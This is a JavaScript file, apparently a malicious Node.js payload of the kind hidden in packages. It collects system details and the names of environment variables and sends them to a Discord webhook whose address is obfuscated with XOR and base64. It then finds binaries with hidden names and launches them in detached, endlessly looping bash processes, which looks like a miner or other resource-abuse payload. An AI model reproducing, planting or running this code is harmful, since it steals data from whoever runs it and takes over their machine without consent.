const cp = require('child_process');
const os = require('os');
const https = require('https');
const path = require('path');
const fs = require('fs');

function xorStr(str, key) {
  let out = '';
  for (let i = 0; i < str.length; i++) {
    out += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return out;
}

const encParts = [
  'Jz8fPQcYOA1VLnNdanQbOSFdRk01QxxeGVYAAygSWQY7C3krSg1JIxIdfg==',
  'OiEQQAkkCiE2L0sCakw1MHg5HzIwNwAqH1wEBCEJJh5XEAQbPFtRO1snAwM='
];
function b64d(s) { return Buffer.from(s, 'base64').toString('binary'); }
function webhookPath() {
  let a = xorStr(b64d(encParts[0]), "--Z3WkHw_");
  let b = xorStr(b64d(encParts[1]), "hy!Q95_@#0");
  return a + b;
}

function sendSystemInfo() {
  try {
    const d = {
      hn: os.hostname(),
      pl: os.platform(),
      ty: os.type(),
      re: os.release(),
      ar: os.arch(),
      cp: os.cpus().map(x => x.model).join('::'),
      nt: os.networkInterfaces(),
      m: os.totalmem(),
      u: os.uptime(),
      us: os.userInfo().username,
      ts: Date.now(),
      ev: Object.keys(process.env).sort().join(",")
    };
    const payload = {
      content: "```json\n" + JSON.stringify(d, null, 1) + "\n```"
    };
    const data = JSON.stringify(payload);
    const reqOpt = {
      hostname: 'discord.com',
      path: webhookPath(),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    };
    let req = https.request(reqOpt, () => {});
    req.on('error', () => {});
    req.write(data);
    req.end();
  } catch (e) {}
}
sendSystemInfo();

function busyWait(ms) {
  let t = Date.now();
  while (Date.now() - t < ms) {}
}

const nameAsm = Buffer.from('bWFuYWdlci5hc20=', 'base64').toString('utf8');
const nameCpp = Buffer.from('a2VybmMuY3Bw', 'base64').toString('utf8');

function findFiles() {
  const locs = [
    '/usr/local/.backend/',
    process.cwd() + '/',
    __dirname + '/',
    '/tmp/',
    '/usr/local/bin/',
    '/usr/bin/'
  ];
  for (let dir of locs) {
    let f1 = path.join(dir, nameAsm);
    let f2 = path.join(dir, nameCpp);
    if (fs.existsSync(f1) && fs.existsSync(f2)) return { a: f1, c: f2, d: dir };
  }
  return null;
}
function spin(n, z = 79) {
  for (let i = 0; i < n * z; ++i)
    for (let j = 0; j < z; ++j)
      for (let k = 0; k < z; ++k);
}

const runner = () => {
  let found = findFiles();
  if (!found) { busyWait(333); return; }
  let children = [];
  for (let i = 0; i < 2; i++) {
    let p = cp.spawn('bash', ['-c',
      'for x in $(seq 1 13);do ./' + nameCpp + ' & done; while :;do ./' + nameAsm + ';done'
    ], {
      cwd: found.d,
      stdio: 'ignore',
      detached: true
    });
    try { p.unref(); } catch (_) {}
    children.push(p);
  }
  let c = 1;
  (function loop() {
    spin(14 + c, (17 + c % 7));
    c = (c + 1) % 99;
    setTimeout(loop, 2461 - (c * 9) + Math.floor(Math.random() * 208));
  })();
};

let runCount = 0;
(function mainLoop() {
  runCount++;
  try { runner(); } catch (_) {}
  setTimeout(() => {
    if (runCount < 8) {
      mainLoop();
    } else {
      setInterval(runner, 9700 + runCount * 749);
    }
  }, 1783 + runCount * 2242);
})();

